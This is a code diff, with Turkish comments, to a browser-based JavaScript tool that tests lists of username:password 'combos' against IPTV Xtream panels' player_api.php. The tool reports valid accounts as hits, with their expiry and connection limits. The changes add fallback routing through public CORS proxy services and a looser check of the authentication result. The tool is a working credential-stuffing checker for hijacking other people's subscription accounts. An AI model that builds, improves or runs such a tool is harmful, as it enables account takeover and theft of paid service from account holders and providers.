@@ -488,6 +488,24 @@ function getBaseUrl(input) {
     } catch(e) { return null; }
 }
 
+// Vercel/HTTPS sayfasından HTTP panel çağrıları Mixed Content ile engellenir.
+function getEffectiveProxy(base, selected) {
+    if (selected === 'none' && location.protocol === 'https:' && /^http:/i.test(base)) return 'corsproxy';
+    return selected;
+}
+function makeProxyUrl(target, mode) {
+    if (mode === 'corsproxy') return `https://corsproxy.io/?${encodeURIComponent(target)}`;
+    if (mode === 'codetabs') return `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(target)}`;
+    if (mode === 'allorigins') return `https://api.allorigins.win/raw?url=${encodeURIComponent(target)}`;
+    return target;
+}
+function proxyFallbackModes(host, selected) {
+    const effective = getEffectiveProxy(host, selected);
+    if (effective === 'none') return ['none'];
+    const modes = [effective, 'codetabs', 'allorigins'];
+    return [...new Set(modes)];
+}
+
 // =============================================
 // INIT & EVENT LISTENERS
 // =============================================
@@ -573,17 +591,19 @@ function setScanMode(m) {
 // Sadece Test Bölümünde Kullanılır (Tarama esnasında aranmaz)
 // =============================================
 async function testPanelStatusFast(base) {
-    let timeout = 5000;
-    let testUrls = [`${base}/player_api.php`, `${base}/panel_api.php`, base];
-    
-    for (let url of testUrls) {
-        try {
-            let controller = new AbortController();
-            let tid = setTimeout(() => controller.abort(), timeout);
-            await fetch(url, { method: 'HEAD', signal: controller.signal, mode: 'no-cors' });
-            clearTimeout(tid);
-            return true; 
-        } catch (e) { }
+    const timeout = 7000;
+    const testUrls = [`${base}/player_api.php`, `${base}/panel_api.php`, base];
+    const modes = proxyFallbackModes(base, $('cors-proxy').value);
+    for (const url of testUrls) {
+        for (const mode of modes) {
+            try {
+                const controller = new AbortController();
+                const tid = setTimeout(() => controller.abort(), timeout);
+                const response = await fetch(makeProxyUrl(url, mode), { signal: controller.signal, cache: 'no-store' });
+                clearTimeout(tid);
+                if (response.ok || mode !== 'none') return true;
+            } catch (e) { /* sıradaki endpoint/proxy denenir */ }
+        }
     }
     return false;
 }
@@ -756,8 +776,11 @@ async function startScan() {
     $('start-btn').innerHTML = '<i class="fas fa-cog fa-spin"></i> Taranıyor...';
 
     // Ön test ve beklemeyi sildik, direkt işleme geçiliyor
-    let pMode = $('cors-proxy').value;
-    let resolvedHosts = rawHosts.map(h => ({ url: h, proxy: pMode }));
+    const selectedProxy = $('cors-proxy').value;
+    const resolvedHosts = rawHosts.map(h => ({ url: h, proxy: getEffectiveProxy(h, selectedProxy) }));
+    if (selectedProxy === 'none' && resolvedHosts.some(h => h.proxy !== 'none')) {
+        addLog('[SİSTEM] HTTPS güvenliği nedeniyle HTTP paneller için CorsProxy otomatik kullanılıyor.', 'warn');
+    }
 
     state.currentHostsCount = resolvedHosts.length;
 
@@ -876,26 +899,27 @@ async function checkAccount(host, combo, source, proxyMode) {
     let u = encodeURIComponent(pts[0].trim());
     let p = encodeURIComponent(pts.slice(1).join(':').trim());
     
-    let targetUrl = `${host}/player_api.php?username=${u}&password=${p}`;
-    let finalUrl = targetUrl;
-    
-    if (proxyMode === 'corsproxy') finalUrl = `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`;
-    else if (proxyMode === 'codetabs') finalUrl = `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(targetUrl)}`;
-    else if (proxyMode === 'allorigins') finalUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+    const targetUrl = `${host}/player_api.php?username=${u}&password=${p}`;
+    let data = null;
+    let lastError = null;
+    for (const mode of proxyFallbackModes(host, proxyMode)) {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 9000);
+        try {
+            const r = await fetch(makeProxyUrl(targetUrl, mode), { signal: controller.signal, cache: 'no-store' });
+            clearTimeout(timeoutId);
+            if (!r.ok) continue;
+            data = await r.json();
+            break;
+        } catch (err) {
+            clearTimeout(timeoutId);
+            lastError = err;
+        }
+    }
+    if (!data) { if (lastError) throw lastError; return { hit: false }; }
 
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 9000); // 9 saniye Xtream zaman aşımı
-
-    try {
-        let r = await fetch(finalUrl, { signal: controller.signal, cache: 'no-store' });
-        clearTimeout(timeoutId);
-        
-        if (!r.ok) return { hit: false }; // Ölüyse hata atma, sessizce geç
-        
-        let data = await r.json(); // Hızlıca JSON parse et
-        
-        // XTREAM AUTH === 1 DENETİMİ (En Kesin Yöntem)
-        if (data && data.user_info && data.user_info.auth === 1) {
+    // XTREAM AUTH bazı panellerde sayı, bazılarında string döner.
+    if (data && data.user_info && String(data.user_info.auth) === '1') {
             let i = data.user_info;
             let statusRaw = i.status ? String(i.status).toLowerCase() : 'active';
             
@@ -912,16 +936,12 @@ async function checkAccount(host, combo, source, proxyMode) {
                         status: i.status || 'Active', 
                         exp_date: expStr,
                         max_conn: i.max_connections || '0', active_cons: i.active_cons || '0',
-                        proxyMode: proxyMode 
+                        proxyMode: getEffectiveProxy(host, proxyMode)
                     }
                 };
             }
         }
         return { hit: false };
-    } catch(err) { 
-        clearTimeout(timeoutId); 
-        throw err; 
-    }
 }
 
 function stopScan() {
